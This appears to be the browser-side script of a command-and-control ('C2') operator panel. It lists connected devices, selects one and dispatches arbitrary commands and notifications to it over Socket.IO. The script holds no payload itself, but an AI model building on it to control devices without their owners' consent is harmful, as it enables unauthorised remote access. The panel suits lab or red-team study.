document.addEventListener('DOMContentLoaded', () => {
    const socket = io();

    const logOutput = document.getElementById('log-output');
    const deviceList = document.getElementById('device-list');
    const refreshBtn = document.getElementById('refresh-btn');
    const selectedDeviceLabel = document.getElementById('selected-device');

    // --- HELPER FUNCTIONS ---
    function logMessage(message) {
        const timestamp = new Date().toLocaleTimeString();
        logOutput.innerHTML += `[${timestamp}] ${message}\n`;
        logOutput.scrollTop = logOutput.scrollHeight; // Auto-scroll
    }

    // --- SOCKET.IO EVENT HANDLERS (RECEIVING FROM SERVER) ---
    socket.on('connect', () => {
        logMessage('Connected to C2 server.');
    });

    socket.on('new_log', (data) => {
        logMessage(data.message);
    });

    socket.on('update_devices', (data) => {
        deviceList.innerHTML = ''; // Clear current list
        if (data.devices.length === 0) {
            deviceList.innerHTML = '<p>No live devices found.</p>';
        } else {
            data.devices.forEach(name => {
                const btn = document.createElement('button');
                btn.className = 'device-btn';
                btn.textContent = name;
                if (name === data.selected) {
                    btn.classList.add('selected');
                }
                btn.addEventListener('click', () => {
                    socket.emit('select_device', { name: name });
                });
                deviceList.appendChild(btn);
            });
        }
        selectedDeviceLabel.textContent = `Selected: ${data.selected}`;
    });

    socket.on('device_selected', (data) => {
        selectedDeviceLabel.textContent = `Selected: ${data.name}`;
        document.querySelectorAll('.device-btn').forEach(btn => {
            btn.classList.remove('selected');
            if (btn.textContent === data.name) {
                btn.classList.add('selected');
            }
        });
    });

    // --- CLIENT-SIDE EVENT LISTENERS (SENDING TO SERVER) ---
    refreshBtn.addEventListener('click', () => {
        socket.emit('refresh_devices');
    });

    // Handle all generic command dispatch buttons
    document.querySelectorAll('.dispatch-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const command = btn.dataset.command;
            const friendlyName = btn.dataset.friendly;
            let args = "";
            if (btn.dataset.input) {
                args = document.getElementById(btn.dataset.input).value;
            }
            socket.emit('dispatch_command', { command, args, friendly_name: friendlyName });
        });
    });

    // Special case for 'Show Notification' button
    document.getElementById('show-notification-btn').addEventListener('click', () => {
        const title = document.getElementById('notif-title-input').value;
        const msg = document.getElementById('notif-msg-input').value;
        const args = `"${title}" ${msg}`;
        socket.emit('dispatch_command', { command: 'shownotification', args, friendly_name: 'Show Notification' });
    });

    // Handle tab switching
    document.querySelectorAll('.tab-link').forEach(button => {
        button.addEventListener('click', () => {
            document.querySelectorAll('.tab-link').forEach(btn => btn.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            
            button.classList.add('active');
            document.getElementById(button.dataset.tab).classList.add('active');
        });
    });
});